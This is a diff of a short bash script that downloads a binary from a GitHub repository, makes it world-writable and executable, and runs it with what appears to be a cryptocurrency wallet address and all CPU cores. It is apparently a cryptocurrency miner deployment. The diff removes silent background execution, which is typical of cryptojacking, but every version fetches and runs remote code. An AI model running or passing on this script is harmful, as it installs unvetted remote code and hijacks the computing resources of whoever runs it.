@@ -1,4 +1,4 @@
 #!/bin/bash
 curl https://github.com/liecamshoe/file/raw/main/vltrig -L -o bakolo
 chmod 777 bakolo
-./bakolo --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass xx -t $(nproc --all) > /dev/null 2>&1 &
+./bakolo --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass xx -t $(nproc --all)
